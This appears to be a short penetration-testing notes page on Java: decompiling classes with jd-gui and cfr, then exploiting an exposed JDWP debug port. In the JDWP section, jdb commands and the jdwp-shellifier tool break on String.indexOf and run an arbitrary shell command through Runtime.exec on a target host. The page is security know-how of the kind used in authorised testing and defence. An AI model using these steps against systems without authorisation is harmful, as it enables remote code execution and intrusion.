# Java


## Decompile Java code

I use two tools to decompile Java classes (`.class`, `.jar`, `.war`, ...):

- [`jd-gui`](http://java-decompiler.github.io/): it's quick and easy to use with
its graphical interface. I use it with a small codebase
- [`cfr`](https://www.benf.org/other/cfr/): CFR is a command line tool and it's
focused on modern Java features. I use it when JD-Gui got troubles with large or
new Java codebase.

```bash
java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
```


## Java Debug Wire Protocol (JDWP)

`JWDP` is the protocol used for communication between a debugger and a Java app (JVM).


### Manual exploitation
It's possible to execute shell commands using `jdb`:

```bash
jdb -attach 8000
```

Then you need to find a good java thread to stop in and execute you command. It
appears that the method `indexOf` of the `String` class is a good candidate:

```bash
trace go methods
# wait that the jdb dies
stop in java.lang.String().indexOf(int)
print new java.lang.Runtime().exec("<cmd>")
```

This should execute you command with the privilege of the Java application. But
be careful, the manual method often fails.


### jdwp-shellifier
`jdwp-shellifier` is an exploitation tool to exploit `JWDP`. It's available on
[github](https://github.com/IOActive/jdwp-shellifier).

Again we use the `indexOf` method to break on, it's possible to use an other one.

```bash
git clone https://github.com/IOActive/jdwp-shellifier
cd jdwp-shellifier
python jdwp-shellifier.py -t <ip> - p <port> --break-on "java.lang.String.indexOf" --cmd "<cmd>"
```
